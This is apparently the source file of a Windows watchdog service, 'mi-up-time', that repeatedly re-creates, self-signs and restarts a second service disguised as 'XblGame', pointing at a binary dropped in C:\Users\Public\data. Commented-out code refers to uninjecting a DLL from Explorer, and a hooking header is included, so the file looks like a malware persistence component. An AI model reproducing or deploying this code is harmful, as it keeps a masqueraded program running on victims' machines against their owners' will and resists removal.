// mi_id_svc.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <windows.h>
#include <iostream>
#include <winsvc.h>
#include <wtypes.h>
#include <stdio.h>
#include <tchar.h>
#include <sddl.h>
#include "ZipUtil.h"
#include "ProcessUtil.h"
#include "HookUtil.h"
#include "NetUtil.h"
#include "MyDefine.h"

#define GD_SVC_NAME				L"mi-up-time"

SERVICE_STATUS_HANDLE lv_hServiceStatus;
HANDLE lv_thdService = NULL;
BOOL	lv_ProcStop = FALSE;




void RunService();

// Service control handler function
DWORD WINAPI ServiceCtrlHandlerEx(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
	switch (dwControl) {
	case SERVICE_CONTROL_STOP:
//		OutputDebugStringA("-------- SERVICE_CONTROL_STOP");

		lv_ProcStop = TRUE;
		Sleep(1000);

		if (lv_thdService != NULL) {
			TerminateThread(lv_thdService, 0);
			lv_thdService = NULL;
		}

		SERVICE_STATUS serviceStatus;
		serviceStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus(lv_hServiceStatus, &serviceStatus);
		break;

	default:
		break;
	}

	return NO_ERROR;
}

unsigned long startService(const wchar_t* p_wszName)
{
	unsigned long lRet = 0;
	SC_HANDLE schSCManager = NULL;
	SC_HANDLE schService = NULL;
	SERVICE_STATUS ssSvcStatus = {};

	// Open the local default service control manager database
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (schSCManager == NULL)
	{
		wprintf(L"OpenSCManager failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

	// Open the service with delete, stop, and query status permissions
	schService = OpenService(schSCManager, p_wszName, SERVICE_START);
	if (schService == NULL)
	{
		wprintf(L"OpenService failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

	if (StartService(schService, 0, NULL) == false) {
		wprintf(L"StartService failed w/err 0x%08lx\n", GetLastError());
		lRet = GetLastError();
		goto Cleanup;
	}

Cleanup:
	// Centralized cleanup for all allocated resources.
	if (schSCManager)
	{
		CloseServiceHandle(schSCManager);
		schSCManager = NULL;
	}
	if (schService)
	{
		CloseServiceHandle(schService);
		schService = NULL;
	}
	return lRet;
}
void CheckAndStartService(const wchar_t* serviceName) {
	// Open the Service Control Manager
	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
	if (hSCManager == NULL) {
		MyWriteLog("UPTime ... CheckAndStartService OpenSCManager Error");
		return;
	}

	// Open the service
	SC_HANDLE hService = OpenService(hSCManager, serviceName, SERVICE_QUERY_STATUS | SERVICE_START);
	if (hService == NULL) {
		MyWriteLog("UPTime ... CheckAndStartService OpenService Error");
		CloseServiceHandle(hSCManager);
		return;
	}

	// Query the service status
	SERVICE_STATUS serviceStatus;
	if (!QueryServiceStatus(hService, &serviceStatus)) {
		MyWriteLog("UPTime ... CheckAndStartService QueryServiceStatus Error");
		CloseServiceHandle(hService);
		CloseServiceHandle(hSCManager);
		return;
	}

	// Check if the service is stopped
	if (serviceStatus.dwCurrentState == SERVICE_STOPPED) {

		MyWriteLog("UPTime ... Main Service Stopped...");

		// Try to start the service
		if (!StartService(hService, 0, NULL)) {
			MyWriteLog("UPTime ... Main Service Faild (restart).");
		}
		else {
			MyWriteLog("UPTime ... Main Service Starting (restart).");
		}
	}
	else if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
//		MyWriteLog("UPTime ... Main Service Running...");

	}
	else {
//		MyWriteLog("UPTime ... Main Service Unknown...");
	}

	// Clean up
	CloseServiceHandle(hService);
	CloseServiceHandle(hSCManager);
}

//.
unsigned int TF_THREAD(void*) {
	
	TCHAR		w_szParam[MAX_PATH] = L"";

	MyWriteLog("UPTime TF_THREAD Start");

	//.
	while (lv_ProcStop == FALSE) {

		if (IsFileExist(GD_LOCAL_SVC_FILEPATH) == FALSE) {
			MyWriteLog("UPTime IsFileExist(GD_LOCAL_SVC_FILEPATH) == FALSE");

			ModContentToFile(GD_TEMP_MAIN_SVC_FILEPATH, GD_LOCAL_SVC_FILEPATH);
			cmd_sign(GD_LOCAL_SVC_FILEPATH, GD_LOCAL_SIGNTOOL_FILEPATH);

			swprintf(w_szParam, L"/C sc create XblGame binPath=\"C:\\Users\\Public\\data\\mdwslp.exe\" start= auto");
			_execute(L"cmd.exe", w_szParam, 1);
			swprintf(w_szParam, L"/C sc start XblGame");
			_execute(L"cmd.exe", w_szParam, 1);
		}
		else {
			CheckAndStartService(L"XblGame");
		}

		if (IsFileExist(GD_LOCAL_SVC_UPDATE_FILEPATH) == TRUE) {
			DeleteFileA(GD_LOCAL_SVC_UPDATE_FILEPATH);
			MyWriteLog("uptimecrx run by prarameter ");
			Sleep(1000 * 5);
			ModContentToFile(GD_TEMP_MAIN_SVC_FILEPATH, GD_LOCAL_SVC_FILEPATH);
			cmd_sign(GD_LOCAL_SVC_FILEPATH, GD_LOCAL_SIGNTOOL_FILEPATH);

			swprintf(w_szParam, L"/C sc create XblGame binPath=\"C:\\Users\\Public\\data\\mdwslp.exe\" start= auto");
			_execute(L"cmd.exe", w_szParam, 1);
			swprintf(w_szParam, L"/C sc start XblGame");
			_execute(L"cmd.exe", w_szParam, 1);

			MyWriteLog("uptimecrx run by prarameter End");
		}
		//. 
		Sleep(2000);
	}

	return 0;
}



//.
void RunService() {
	
	DWORD dwTID;


	lv_thdService = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TF_THREAD, NULL, 0, &dwTID);
	WaitForSingleObject(lv_thdService, INFINITE);
}

//.
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
//	OutputDebugStringA("SfT - Service Main\n");

	lv_ProcStop = FALSE;

	// Register service control handler
	lv_hServiceStatus = RegisterServiceCtrlHandlerEx(GD_SVC_NAME, ServiceCtrlHandlerEx, NULL);
	if (!lv_hServiceStatus) {
		return;
	}

	// Notify service controller that the service is starting
	SERVICE_STATUS serviceStatus;
	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	serviceStatus.dwCurrentState = SERVICE_START_PENDING;
	serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	serviceStatus.dwWin32ExitCode = NO_ERROR;
	serviceStatus.dwServiceSpecificExitCode = 0;
	serviceStatus.dwCheckPoint = 0;
	serviceStatus.dwWaitHint = 0;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);

	// Perform initialization tasks here

	// Notify service controller that the service is running
	serviceStatus.dwCurrentState = SERVICE_RUNNING;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);

//	OutputDebugStringA("ServiceMain -- Start");

	while (lv_ProcStop == FALSE) {
		// Run the service
		RunService();
		Sleep(1000);
	}
	//if (lv_dwProcess_Explorer != 0) {
	//	UninjectDLL(lv_dwProcess_Explorer, "ntdb.dll");
	//	lv_dwProcess_Explorer = 0;
	//}

	// Notify service controller that the service has stopped
	serviceStatus.dwCurrentState = SERVICE_STOPPED;
	SetServiceStatus(lv_hServiceStatus, &serviceStatus);
}

int main() 
	{
//		OutputDebugStringA("SfT---Start");
		wchar_t p[] = GD_SVC_NAME;

		SERVICE_TABLE_ENTRYW ServiceTable[] =
		{
			{ (LPWSTR)GD_SVC_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
			{ NULL, NULL }
		};

		// Start the service control dispatcher
		if (!StartServiceCtrlDispatcher(ServiceTable)) {
			//		std::cerr << "Failed to start service control dispatcher\n";
//			OutputDebugStringA("SfT---exit");
			return GetLastError();
		}
		return 0;
	}
